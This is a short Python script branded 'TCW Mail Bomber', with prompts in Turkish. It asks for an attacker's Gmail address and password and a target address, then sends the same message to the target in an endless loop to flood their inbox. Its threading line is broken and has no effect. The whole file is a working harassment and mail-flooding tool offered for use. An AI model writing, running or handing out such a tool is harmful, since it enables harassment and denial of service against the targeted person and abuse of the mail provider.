import smtplib
from threading import Thread
TCW = """

  $$$$$$$$\  $$$$$$\  $$\      $$\       $$\      $$\           $$\ $$\       $$$$$$$\                          $$\                           
\__$$  __|$$  __$$\ $$ | $\  $$ |      $$$\    $$$ |          \__|$$ |      $$  __$$\                         $$ |                          
   $$ |   $$ /  \__|$$ |$$$\ $$ |      $$$$\  $$$$ | $$$$$$\  $$\ $$ |      $$ |  $$ | $$$$$$\  $$$$$$\$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  
   $$ |   $$ |      $$ $$ $$\$$ |      $$\$$\$$ $$ | \____$$\ $$ |$$ |      $$$$$$$\ |$$  __$$\ $$  _$$  _$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
   $$ |   $$ |      $$$$  _$$$$ |      $$ \$$$  $$ | $$$$$$$ |$$ |$$ |      $$  __$$\ $$ /  $$ |$$ / $$ / $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|
   $$ |   $$ |  $$\ $$$  / \$$$ |      $$ |\$  /$$ |$$  __$$ |$$ |$$ |      $$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$ |  $$ |$$   ____|$$ |      
   $$ |   \$$$$$$  |$$  /   \$$ |      $$ | \_/ $$ |\$$$$$$$ |$$ |$$ |      $$$$$$$  |\$$$$$$  |$$ | $$ | $$ |$$$$$$$  |\$$$$$$$\ $$ |      
   \__|    \______/ \__/     \__|      \__|     \__| \_______|\__|\__|      \_______/  \______/ \__| \__| \__|\_______/  \_______|\__|      
                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
"""
print(TCW)
m = input("Saldırıyı yapacak olan mail adresi :  ")
p = input("Saldırıyı yapacak mailin şifresi : ")
a = input("Saldırılacak mail adresi : ")


content = input("enter message : ")
mail = smtplib.SMTP("smtp.gmail.com",587)
mail.ehlo()
mail.starttls()
mail.login(m,p)
while True:
    mail.sendmail(m,a,content)
    t = Thread(target = mail.sendmail, args = (mail.login,))
    t.start
    print("Mail gönderildi")
